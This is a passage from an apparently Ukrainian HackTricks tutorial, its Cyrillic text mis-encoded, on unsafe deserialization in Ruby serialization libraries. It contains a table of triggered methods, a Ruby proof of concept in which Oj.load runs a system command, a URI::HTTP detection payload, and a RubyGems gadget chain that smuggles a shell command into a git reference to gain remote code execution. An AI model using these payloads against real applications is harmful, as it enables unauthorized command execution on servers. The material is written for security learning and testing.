–Ü—Å–Ω—É—é—Ç—å —ñ–Ω—à—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ Ruby, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –æ–±'—î–∫—Ç—ñ–≤, —ñ —Ç–æ–º—É —ó—Ö –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE –ø—ñ–¥ —á–∞—Å –Ω–µ–±–µ–∑–ø–µ—á–Ω–æ—ó –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –ù–∞—Å—Ç—É–ø–Ω–∞ —Ç–∞–±–ª–∏—Ü—è –ø–æ–∫–∞–∑—É—î –¥–µ—è–∫—ñ –∑ —Ü–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ —Ç–∞ –º–µ—Ç–æ–¥, —è–∫–∏–π –≤–æ–Ω–∏ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å –∑ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –≤–æ–Ω–∞ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è (—Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>–ë—ñ–±–ª—ñ–æ—Ç–µ–∫–∞</strong></td><td><strong>–í—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ</strong></td><td><strong>–ú–µ—Ç–æ–¥ –∑–∞–ø—É—Å–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—É</strong></td></tr><tr><td>Marshal (Ruby)</td><td>–ë—ñ–Ω–∞—Ä–Ω—ñ</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (–∫–ª–∞—Å –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–º—ñ—Å—Ç–∏—Ç–∏ –≤ hash(map) —è–∫ –∫–ª—é—á)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (–∫–ª–∞—Å –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–º—ñ—Å—Ç–∏—Ç–∏ –≤ hash(map) —è–∫ –∫–ª—é—á)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (–∫–ª–∞—Å –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–º—ñ—Å—Ç–∏—Ç–∏ –≤ hash(map) —è–∫ –∫–ª—é—á)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([–¥–∏–≤. –ø—Ä–∏–º—ñ—Ç–∫–∏ —â–æ–¥–æ json_create –≤ –∫—ñ–Ω—Ü—ñ](#table-vulnerable-sinks))</td></tr></tbody></table>

–ë–∞–∑–æ–≤–∏–π –ø—Ä–∏–∫–ª–∞–¥:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
–£ –≤–∏–ø–∞–¥–∫—É —Å–ø—Ä–æ–±–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Oj, –≤–¥–∞–ª–æ—Å—è –∑–Ω–∞–π—Ç–∏ –∫–ª–∞—Å –≥–∞–¥–∂–µ—Ç–∞, —è–∫–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–≤–æ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó `hash` –≤–∏–∫–ª–∏–∫–∞—î `to_s`, —â–æ –≤–∏–∫–ª–∏–∫–∞—î spec, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î fetch\_path, —â–æ –¥–æ–∑–≤–æ–ª—è–ª–æ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± –≤—ñ–Ω –æ—Ç—Ä–∏–º—É–≤–∞–≤ –≤–∏–ø–∞–¥–∫–æ–≤—É URL-–∞–¥—Ä–µ—Å—É, –Ω–∞–¥–∞—é—á–∏ —á—É–¥–æ–≤–∏–π –¥–µ—Ç–µ–∫—Ç–æ—Ä —Ç–∞–∫–∏—Ö –Ω–µ–∑–∞—Ö–∏—â–µ–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –±—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ, —â–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –≤ —Å–∏—Å—Ç–µ–º—ñ —Ç–∞–∫–æ–∂ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –ø–∞–ø–∫–∞, —â–æ —î –≤–∏–º–æ–≥–æ—é –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —ñ–Ω—à–∏–º –≥–∞–¥–∂–µ—Ç–æ–º, —â–æ–± –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ —Ü–µ –Ω–∞ –ø–æ–≤–Ω–æ—Ü—ñ–Ω–Ω–∏–π RCE –∑ —á–∏–º–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—ñ–ª—å—à–µ –¥–µ—Ç–∞–ª–µ–π —É [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –ø–æ—Å—Ç—ñ**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
